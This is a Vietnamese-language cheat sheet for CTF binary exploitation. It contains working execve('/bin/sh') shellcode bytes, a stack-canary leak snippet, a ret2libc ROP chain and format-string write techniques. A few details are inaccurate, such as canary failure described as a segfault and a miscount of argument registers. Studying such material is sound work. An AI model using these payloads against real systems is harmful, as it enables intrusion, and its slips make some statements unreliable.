# 🛠️ PWN STUDY NOTES

## 🧠 COMPUTER ARCHITECTURE

| Register | Description |
|----------|-------------|
| `rax`    | Return value of a function → `rax`, `eax`, `ax`, `ah`, `al` (64/32/16/8/8) |
| `rbx`    | Base register (no specific use in x64) |
| `rcx`    | Counter register for loops |
| `rdx`    | Data register |
| `rsi`    | Source index (source in data movement) |
| `rdi`    | Destination index (destination in data movement) |
| `rsp`    | Stack pointer |
| `rbp`    | Stack base pointer |

---

## 🧱 MEMORY STRUCTURE OF LINUX PROCESS

- **Code Segment (.text)**: executable code (r--x)
- **Data Segment**: initialized global/static vars (rw-)
- **BSS Segment**: uninitialized global/static vars (rw-)
- **Heap Segment**: dynamic memory allocation (rw-)
- **Stack Segment**: local vars, return addresses (rw-)
- **Extra Segment**: `fs` and `gs` (used by OS)

---

## ⚙️ ASSEMBLY BASICS

### 🔹 Opcodes

- **Data Transfer**: `mov`, `lea`
- **Arithmetic**: `inc`, `dec`, `add`, `sub`
- **Logic**: `and`, `or`, `xor`, `not`
- **Comparison**: `cmp`, `test`
- **Branch**: `jmp`, `je`, `jg`
- **Stack**: `push`, `pop`
- **Procedure**: `call`, `ret`, `leave`
- **System call**: `syscall`

### 🔹 Memory Operands

- `QWORD PTR [addr]`: 8 bytes
- `DWORD PTR [addr]`: 4 bytes
- `WORD PTR [rax]`: 2 bytes

---

## 🐚 SHELLCODE

### 📌 Mục tiêu
Gọi `execve("/bin/sh", NULL, NULL)` để thực thi shell.

---

### 🧬 Syscall Convention (x86_64)

| Register | Vai trò |
|----------|---------|
| `rax`    | Syscall number (`0x3b` cho `execve`) |
| `rdi`    | arg0: filename (`/bin/sh`) |
| `rsi`    | arg1: argv (NULL) |
| `rdx`    | arg2: envp (NULL) |

---

### 🔩 Shellcode (x86_64)

```asm
mov rax, 0x68732f6e69622f   ; "/bin/sh" in hex
push rax
mov rdi, rsp                ; rdi = pointer to "/bin/sh"
xor rsi, rsi                ; rsi = NULL
xor rdx, rdx                ; rdx = NULL
mov rax, 0x3b               ; rax = syscall number for execve
syscall
```
bytes
`\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05`

---

### 🔩 Shellcode (x86)

```asm
xor eax, eax
xor ecx, ecx
xor edx, edx
add eax, 0x0b               ; syscall number for execve
xor ebx, ebx
push ebx
push 0x68732f2f             ; "//sh"
push 0x6e69622f             ; "/bin"
mov ebx, esp
int 0x80                    ; syscall
```
bytes
`\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80`

## 💥 BUFFER OVERFLOW

### 🧵 Các hàm nhập liệu gây overflow

#### `gets(buf)`
- **Không giới hạn** độ dài input.
- Nhận dữ liệu đến khi gặp `\n`, **không lưu `\n`**.
- Tự động thêm `\0` vào cuối chuỗi.
- **Dễ bị stack overflow.**

#### `scanf("%s", buf)`
- **Không giới hạn** input.
- Nhận dữ liệu đến khi gặp khoảng trắng `" "`.
- Hành vi tương tự như `gets()`.

#### `scanf("%[width]s", buf)`
- Đọc tối đa `width` ký tự.
- Nếu `width > sizeof(buf) - 1` → **có thể tràn bộ nhớ**.
- Không đảm bảo chuỗi **có null-termination** (`\0`).

#### `fgets(buf, len, stream)`
- Đọc tối đa `len - 1` ký tự, phần còn lại dành cho `\0`.
- Luôn **null-terminate** chuỗi.
- Nếu input < `len`, phần còn lại được lấp bằng `\0`.
- Nếu input = `len`, byte cuối bị bỏ và thêm `\0`.
- Có thể **mất dữ liệu**, ví dụ: buffer 30 byte → lưu được 29 ký tự nếu `len = 30`.
- Nếu còn chỗ, lưu `"\n\0"`.

---

### 📌 Phân loại Overflow

- **Stack Overflow**: Ghi đè lên stack (return address, canary, ...)
- **Heap Overflow**: Ghi đè vùng nhớ được cấp phát động (`malloc`, `calloc`, ...)

## 🛡️ CANARY (Stack Smashing Protector)

### 🧠 Mục đích
- **Chống tấn công buffer overflow** bằng cách phát hiện ghi đè lên vùng nhớ nhạy cảm.
- Nếu canary bị ghi đè → chương trình sẽ **Segmentation fault** và dừng ngay lập tức.

---

### 🔐 Cấu trúc
- Được lưu tại: `[rbp - 0x8]`
- Là một chuỗi **8 bytes ngẫu nhiên**, **byte đầu luôn là `\x00`**.

---

### 🕵️ Leak Canary (ví dụ với pwntools)

````
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))  # nối thêm byte null vào đầu để đủ 8 bytes
slog('canary', cnry)
````

## 🔒 NX & ASLR

### 🚫 NX (No-eXecute)
- **Chống Shellcode**: Ngăn chặn thực thi code ở vùng bộ nhớ không được đánh dấu là thực thi.

---

### 🎲 ASLR (Address Space Layout Randomization)
- **Mục tiêu**: Phân bổ ngẫu nhiên địa chỉ cho stack, heap, shared libraries, ... mỗi khi chạy binary.
- **Lợi ích**: Gây khó khăn cho việc đoán địa chỉ khi tấn công.

---

### 🔗 RELRO (RELocation Read-Only)
- **no RELRO**: Cho phép ghi đè lên GOT (Global Offset Table).
- **partial RELRO**: GOT được chuyển thành chỉ đọc sau khi khởi tạo, nhưng một số phần vẫn có thể bị tấn công.
- **full RELRO**: Toàn bộ GOT được bảo vệ, **không thể ghi đè**.

---

### 🔧 Hook Overwrite
- **Ý tưởng**: Bypass RELRO bằng cách ghi đè các con trỏ hàm (như `malloc()`, `free()`, `realloc()`) với địa chỉ của hàm tùy ý nhằm thực thi code độc hại.

## 📌 PIE & RELRO

### 🔀 PIE (Position-Independent Executable)
- **Mục tiêu:** Thực thi binary với địa chỉ load thay đổi ( base address), làm cho việc exploit trở nên khó khăn hơn.
- **Hoạt động:** Mỗi lần chạy, binary sẽ được load vào một địa chỉ ngẫu nhiên, khiến cho việc đoán địa chỉ trở nên phức tạp.

---

### 🔄 PIC (Position-Independent Code)
- **Mục tiêu:** Cho phép code chạy đúng ở bất kỳ vị trí nào trong bộ nhớ.
- **Đặc điểm:** 
  - Không sử dụng địa chỉ tuyệt đối.
  - Phụ thuộc vào các địa chỉ tương đối (dựa trên giá trị của `RIP` trên x86_64) để thực hiện các phép tính địa chỉ.
- **Lợi ích:** Tăng tính linh hoạt và an toàn khi chương trình được load ở các địa chỉ khác nhau.

---

### 🔗 RELRO (RELocation Read-Only)
- **Bảo vệ:** Ngăn chặn ghi đè lên bảng địa chỉ (GOT) nhằm bảo vệ các hàm quan trọng khỏi bị khai thác.
- **Các cấp độ bảo vệ:**
  - **No RELRO:** GOT có thể bị ghi đè, dễ bị tấn công.
  - **Partial RELRO:** Một số phần của GOT được chuyển sang chế độ read-only sau khi khởi tạo.
  - **Full RELRO:** Toàn bộ GOT được bảo vệ hoàn toàn, rất khó bị khai thác.

## 🔄 R2L-ROP

### 📌 Khái niệm cơ bản

- **r2l (Return-to-libc):** Sử dụng lệnh `ret` để gọi hàm có sẵn trong libc, ví dụ: `system("/bin/sh")`.
- **ROP (Return Oriented Programming):** Sử dụng chuỗi các gadget (lệnh `ret` kết hợp với các lệnh nhỏ) để điều khiển luồng thực thi của chương trình.
- **GOT (Global Offset Table):** Bảng chứa địa chỉ của các hàm trong libc (ví dụ: `puts`).
- **PLT (Procedure Linkage Table):** Sử dụng để gọi các hàm qua GOT.
- Call a func : func_plt -> func_got -> func_libc
---

### 🔧 Các chi tiết kỹ thuật

- **Padding Return Address:** 
  - Return address được cấp 16 bytes.
  - Thêm lệnh `ret` trước gadget như `pop rdi; ret` để tránh lỗi do `movaps`.

- **Xác định địa chỉ hàm:**
  - Thông thường, `system` được tính bằng công thức:  
    `system = read - 0xc3c20`  
    (tham khảo `readelf -s libc.so.6 | grep "read@"` để biết offset chính xác)

- **Tìm ROP Gadget:**
  - Sử dụng lệnh:  
    ```bash
    ROP gadget --binary filename | grep "gadget"  
    #tìm ngay trong process
    pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0] #tìm các thanh ghi ex: pop rdi ; ret
    ```  
    ví dụ: tìm gadget `pop rdi; ret` để thiết lập đối số cho `system`.  
    quay lại `main` để khai thác tiếp (`e.symbols['main']`)

---

### 📌 Ví dụ trên x64

1. **Leak địa chỉ libc:**
   - Sử dụng hàm như `puts` để in ra địa chỉ được lưu trong GOT.
   - Ví dụ: dùng gadget `pop rdi; ret` để đưa địa chỉ của `puts@got` vào rdi và sau đó gọi `puts(puts@got)`.
   - Tính toán:
     - `libc_base = leaked_address - puts_offset (libc.symbols['puts'])`

2. **Xác định địa chỉ hàm `system` và chuỗi `/bin/sh`:**
   - `system = libc_base + system_offset`
   - `binsh = libc_base + offset_of_bin_sh`

3. **Triển khai ROP:**
   - Sử dụng gadget `pop rdi; ret` để thiết lập đối số cho hàm `system`.
   - ROP mẫu:  
     ```python
     p64(pop_rdi_ret) + p64(binsh) + p64(system)
     ```

---

### 📌 Ví dụ trên x86

Quy trình tấn công trên x86 có thể bao gồm:
1. Đọc dữ liệu vào writable area: `read(0, writableArea, len("/bin/sh"))`
2. Ghi địa chỉ của read_got ra màn hình: `write(1, read_got, len(str(read_got)))`
3. Đọc địa chỉ mới từ read_got: `read(0, read_got, len(str(read_got)))`
4. Gọi system với writableArea chứa "/bin/sh": `system(writableArea)`

## 📏 OUT OF BOUNDS

- **Out of Bounds (OOB):** Xảy ra khi chỉ số dùng để truy cập phần tử của mảng âm hoặc vượt quá độ dài của mảng.
- **Truy cập phần tử mảng:**  
  ```c
  &arr[k] = arr + sizeof(elem) * k

## 🔠 FORMAT STRING VULNERABILITY (FSB)

### Cách Hoạt Động của `printf`
- **`printf("%s", input)`**: In ra chuỗi được truyền vào biến `input`.
- **`printf("%s")`**: Nếu không có đối số, sẽ in ra giá trị tại địa chỉ thứ 1 trên stack.

### Chỉ Định Tham Số với `$`
- **`printf("%30$s")`**: In ra giá trị của đối số thứ 30 trên stack.
- **`printf("%6$p")`**: In ra địa chỉ (theo dạng hex có `0x`) của đối số thứ 6 trên stack.
- **`printf("%6$x")`**: In ra giá trị hex của đối số thứ 6 trên stack, không kèm `0x`.

### Ứng Dụng của Format String
- **Leak thông tin:**  
  Sử dụng các format specifier như `%p`, `%x`, `%d`, `%*\n` để leak các giá trị trên stack (địa chỉ, giá trị số, ...).
- **Đọc dữ liệu vùng nhớ:**  
  Sử dụng `%s` để in ra chuỗi nằm tại địa chỉ được tham chiếu từ stack (ví dụ: đọc flag).
- **Ghi đè bộ nhớ:**  
  Sử dụng `%n`, `%hn`, `%hhn` để ghi số lượng ký tự đã in ra vào một địa chỉ cụ thể, cho phép thay đổi giá trị của biến trong bộ nhớ.

### Phân Biệt 32-bit và 64-bit
- **32-bit:** Các đối số thường được in trực tiếp từ stack.
- **64-bit:**  
  - 5 đối số đầu tiên được truyền qua các thanh ghi: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`.
  - Từ đối số thứ 6 trở đi, các giá trị được lấy từ stack (ví dụ: `rsp`, `rsp+0x8`, `rsp+0x10`, `rsp+0x18`).
## 🐞 DEBUG & PWNDGB COMMANDS

Pwndbg là một extension cho GDB, cung cấp nhiều lệnh hữu ích để phân tích và khai thác binary. Dưới đây là danh sách các lệnh cơ bản và nâng cao cùng với mô tả:

---

### 🔍 Các lệnh cơ bản

- **checksec**
  - Hiển thị các tính năng bảo mật của binary:
    - **Canary:** Chống buffer overflow (thường được đặt tại `[rbp-0x8]`).
    - **NX (Non-Executable):** Ngăn chặn thực thi shellcode trên stack.
    - **PIE (Position Independent Executable):** Binary được load tại địa chỉ ngẫu nhiên.
    - **RELRO (RELocation Read-Only):** Kiểm tra tính năng bảo vệ bảng địa chỉ (GOT). (anti GOT overwrite)
  
- **start**
  - Chạy chương trình và dừng ngay tại đầu hàm `main`, giúp bạn nhanh chóng bắt đầu debug.

- **disass main**
  - Disassemble hàm `main` để xem mã lệnh máy (assembly) của chương trình.

- **vmmap**
  - Hiển thị sơ đồ bộ nhớ ảo của tiến trình, bao gồm các vùng: stack, heap, thư viện, và các segment khác.

- **r**
  - Chạy chương trình từ đầu.

- **b *address**
  - Đặt breakpoint tại một địa chỉ cụ thể.
  - *Ví dụ:* `b *0x400123`

- **del <breakpoint>**
  - Xóa breakpoint đã đặt.

- **c**
  - Tiếp tục thực thi chương trình cho đến breakpoint tiếp theo hoặc khi chương trình dừng.

- **si**
  - Step Into: Thực thi lệnh tiếp theo và bước vào bên trong các hàm (nếu có).

- **ni**
  - Next Instruction: Thực thi lệnh tiếp theo nhưng không bước vào các hàm.

- **i**
  - Lệnh `info` để hiển thị thông tin, ví dụ:
    - `i r`: Thông tin về các thanh ghi.
    - `i b`: Danh sách breakpoints.

- **k**
  - Kill: Dừng tiến trình đang debug.

- **bt**
  - Backtrace: Hiển thị ngăn xếp lời gọi (call stack) tại thời điểm dừng.

- **examine (x/)**
  - Kiểm tra bộ nhớ tại một địa chỉ nhất định.
  - Cú pháp: `x/<format> <address>`
    - `wx`: 4 bytes (word) dưới dạng hex.
    - `bx`: 1 byte dưới dạng hex.
    - `4i`: 4 lệnh (instructions).
    - `s`: In ra chuỗi (string).
  - *Ví dụ:* `x/10wx 0x601000` hiển thị 10 word dưới dạng hex từ địa chỉ `0x601000`.

---

### 🔢 Các thanh ghi quan trọng

- **RSP (64-bit) / ESP (32-bit)**
  - Con trỏ stack; trỏ tới đỉnh của stack.

- **RIP (64-bit) / EIP (32-bit)**
  - Con trỏ lệnh; chứa địa chỉ của lệnh tiếp theo sẽ được thực thi.

---

### 🚀 Các lệnh nâng cao trong pwndbg

- **context**
  - Hiển thị tổng quan về trạng thái hiện tại của tiến trình, bao gồm các thanh ghi, stack, và disassembly xung quanh địa chỉ hiện tại.

- **heap**
  - Hiển thị thông tin chi tiết về heap, hỗ trợ phân tích các lỗ hổng liên quan đến heap.

- **search**
  - Tìm kiếm một chuỗi hoặc dãy byte trong bộ nhớ.
  - *Ví dụ:* `search "flag"` sẽ tìm tất cả các vị trí chứa chuỗi `"flag"`.

- **pattern_create** và **pattern_offset**
  - Hữu ích khi tạo và phân tích các chuỗi pattern (cyclic pattern) để tìm offset trong quá trình exploit:
    - `pattern_create 100`: Tạo pattern với 100 byte.
    - `pattern_offset <value>`: Xác định vị trí của giá trị `<value>` trong pattern.

- **vmmap**
  - Hiển thị chi tiết hơn về layout bộ nhớ, bao gồm quyền truy cập và các file đã map.

## 🧰 PWNTOOLS

PwnTools là thư viện mạnh mẽ hỗ trợ khai thác và tự động hóa các tác vụ tương tác với binary. Dưới đây là một số lệnh và kỹ thuật cơ bản:

---

### 🔹 Process & Remote

```python
from pwn import *

# Khởi tạo process cục bộ
p = process('./filename')        # Local binary

# Kết nối tới server từ xa
p = remote('address', port)      # Remote server

# Đính kèm gdb để debug (với API của pwntools)
gdb.attach(p, api=True)
```

### 🔹 ELF & Libc

```python
# Load binary và libc
e = ELF('./filename')
libc = ELF('./libc.so.6')

# Lấy địa chỉ từ PLT (Procedure Linkage Table)
plt_addr = e.plt['funcname']

# Lấy địa chỉ từ GOT (Global Offset Table)
got_addr = e.got['funcname']

# Lấy offset của hàm trong binary
func_offset = e.symbols['funcname']

# Lấy offset của hàm trong libc (chú ý: tên symbol phải chính xác)
libc_func_offset = libc.symbols['funcname']

# Tìm vị trí chuỗi "/bin/sh" trong libc
bin_sh = list(libc.search(b'/bin/sh'))[0]
```

### 🔹 Packing & Unpacking

```python
# Chuyển đổi số thành chuỗi byte dạng little-endian (64-bit và 32-bit)
packed_64 = p64(0xdeadbeef)
packed_32 = p32(0xdeadbeef)

# Giải nén chuỗi byte thành số nguyên (64-bit và 32-bit)
number_64 = u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')
number_32 = u32(b'\xef\xbe\xad\xde')
```

### 🔹 Sending and receiving data

```python
# Gửi dữ liệu
p.send(b'A')                      # Gửi 1 byte 'A'
p.sendline(b'A')                  # Gửi 'A' kèm newline

# Gửi dữ liệu sau khi nhận được prompt
p.sendafter(b'hello', b'A')
p.sendlineafter(b'hello', b'A')

#send and sendline
send: read
sendline: scanf, gets, fgets

# Nhận dữ liệu
data = p.recv(1024)               # Nhận tối đa 1024 byte
line = p.recvline()               # Nhận đến khi gặp newline
exact = p.recvn(5)                # Nhận chính xác 5 byte
until = p.recvuntil(b'hello')     # Nhận cho đến khi gặp chuỗi 'hello'
all_data = p.recvall()            # Nhận toàn bộ dữ liệu cho đến khi process kết thúc
```

### 🔹 Shellcode

```python
# Shellcode dạng bytes (x86)
shellcode_x86 = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9"
    b"\x31\xd2\xb0\x0b\xcd\x80"
)

# Shellcode dạng bytes (x86_64)
shellcode_x86_64 = (
    b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E"
    b"\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2"
    b"\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
)

# Tạo shellcode để spawn shell bằng shellcraft
code = shellcraft.sh()
machine_code = asm(code)          # Assembles shellcode thành machine code

# Ví dụ: sử dụng shellcode để cat file (lúc excerve bị band)
shellcraft.cat() có thể được sử dụng để in nội dung của file trong một số tình huống
```

### 🔹 Print & Interactive

```python
# Hiển thị thông tin ra console
log.info("Thông tin hữu ích" + info)

# Chuyển sang chế độ interactive để tương tác trực tiếp với process
p.interactive()
```
## 📚 PWNINIT

-`pwninit`: tự patch file  
-`mv file_patch file`: đổi tên





